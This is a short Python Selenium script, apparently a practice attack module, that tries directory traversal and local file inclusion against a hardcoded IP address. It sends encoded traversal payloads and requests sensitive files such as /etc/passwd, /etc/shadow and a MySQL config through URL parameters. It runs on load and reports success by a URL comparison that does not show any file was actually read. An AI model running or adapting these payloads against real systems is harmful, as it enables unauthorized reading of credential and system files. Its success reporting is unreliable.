"""

Module Broken Auth.
Urls: http://34.192.19.10/directory_traversal_2.php?directory=documents
http://34.192.19.10/directory_traversal_1.php?page=message.txt

"""

from main import init
from selenium.webdriver.common.keys import Keys
import time

PATH = "C:\Program Files (x86)\chromedriver.exe"

def lfi_rfi_attack():

    directory_traversal_list = [
        '../',
        '../../',
        '../../../',
        '../../../etc/',
        '..\/',
        '%252e%252e%252f',
        '%c0%ae%c0%ae%c0%af',
    ]

    file_list = [
        'c:\windows\system32\license.rtf',
        'c:\windows\system32\eula.txt',
        '/etc/issue',
        '../../../etc/passwd',
        '../../../etc/shadow',
        '../../../etc/group',
        '../../../etc/hosts',
        '../../../etc/motd',
        '../../../etc/mysql/my.cnf',
        '../var/log/',
    ]

    target_url = 'http://34.192.19.10/directory_traversal_2.php?directory=documents'
    driver = init()[0]
    driver.get(target_url)

    for directory_traversal in directory_traversal_list:
        # print(path)
        target_url = f'http://34.192.19.10/directory_traversal_2.php?directory={directory_traversal}'
        driver.get(target_url)
        if target_url == driver.current_url:
            print('[ + ] Path Traversal Attack passed: ', directory_traversal)
        # html = driver.find_element_by_id('main').text
        # print(html)
        time.sleep(3)

    for file in file_list:
        target_url = f'http://34.192.19.10/directory_traversal_1.php?page={file}'
        driver.get(target_url)
        if target_url == driver.current_url:
            print('[ + ] Path Traversal Attack passed: ', file)
        # html = driver.find_element_by_id('main').text
        # print(html)
        time.sleep(3)



    time.sleep(10)

lfi_rfi_attack()
